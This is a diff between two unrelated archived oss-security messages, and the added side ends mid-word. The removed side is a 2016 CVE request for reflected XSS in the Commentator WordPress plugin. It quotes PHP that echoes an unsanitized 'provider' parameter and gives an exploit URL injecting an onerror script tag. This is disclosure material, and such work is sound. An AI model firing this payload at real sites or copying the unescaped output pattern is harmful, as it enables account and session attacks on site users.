@@ -1,53 +1,23 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/13/5
-Message-ID: <CADLX=aE8i3sGRMXGAAXwrgxY47b-QcPMBQoGRPKOAsmWcTJoZA@mail.gmail.com>
-Date: Wed, 13 Jan 2016 19:42:12 +0530
-From: Rahul Pratap Singh <techno.rps@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/06/15/10
+Message-ID: <20160615033118.GA10094@perpetual.pseudorandom.co.uk>
+Date: Tue, 14 Jun 2016 23:31:18 -0400
+From: Simon McVittie <smcv@...ian.org>
 To: oss-security@...ts.openwall.com
-Subject: CVE Request: Commentator WordPress Plugin 2.5.2 XSS Vulnerability
+Subject: Re: CVE-2016-5317: GNOME nautilus: crash occurs when generating a thumbnail for a crafted TIFF image
 Content-Type: text/plain; charset=utf-8
 
-Reflected XSS Vulnerability:
+On Wed, 15 Jun 2016 at 02:38:54 +0000, 张开翔 wrote:
+> Product: nautilus
+> Affected Versions: <= GNOME nautilus 3.18.5, <=libtiff.so 4.0.6
+...
+> Vendor URL: https://www.gnome.org/
 
-I would request you to assign CVE id to this issue.
+Is there something about this vulnerability that makes it a Nautilus
+vulnerability? From the stack trace you quoted, this looks like a
+generic libtiff vulnerability that would affect any user of libtiff
+equally, with Nautilus' role in this vulnerability merely being a
+convenient user of libtiff that's easy to point at potentially
+untrusted files?
 
-----------------------------------------
-Description:
-----------------------------------------
-"provider" parameter is not sanitized that leads to Reflected XSS.
-
-----------------------------------------
-Vulnerable Code:
-----------------------------------------
-file: commentator.php
-
-line:441
-$provider_name = $_REQUEST["provider"];
-
-line:544
-<div id="commentator-social-signin" class="commentator-<?php echo
-$provider_name; ?>">
-
-----------------------------------------
-Exploit:
-----------------------------------------
-/wp-admin/admin-ajax.php?action=commentator_social_signin&provider=facebook">%20<IMG%20SRC=axc%20onerror=alert(1)>
-
-----------------------------------------
-POC:
-----------------------------------------
-https://0x62626262.files.wordpress.com/2016/01/commentatorxsspoc.png
-
-Fix:
-Update to 2.5.3
-
-Disclosure Timeline:
-reported to vendor  : 9/1/2016
-vendor response     : 11/1/2016
-vendor acknowledged : 11/1/2016
-vendor deployed a patch: 11/1/2016
-
-Pub ref:
-http://codecanyon.net/item/commentator-wordpress-plugin/6425752
-https://0x62626262.wordpress.com/2016/01/13/commentator-wordpress-plugin-xss-vulnerability
-
+    S
